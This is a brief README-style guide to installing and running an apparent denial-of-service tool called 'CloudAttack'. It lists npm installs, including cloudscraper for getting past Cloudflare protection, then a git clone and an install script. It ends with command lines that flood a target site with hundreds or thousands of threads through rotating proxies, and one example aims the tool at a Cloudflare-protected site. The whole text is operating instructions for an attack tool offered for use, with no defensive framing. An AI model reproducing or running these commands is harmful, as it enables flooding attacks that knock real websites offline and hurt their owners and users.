Install on Kali/Debian

npm install
npm install minimist
npm install cloudscraper

git clone https://github.com/W3b38/ProxyAttack.git
cd CloudAttack
chmod +x install.sh
./install.sh

Run: node cloudattack.js --attack "yoursite" --threads 500 
Proxys: --proxy true --updateproxy true


Example: node cloudattack.js --attack "https://www.acloudflaresite.com" --threads 1000 --proxy true
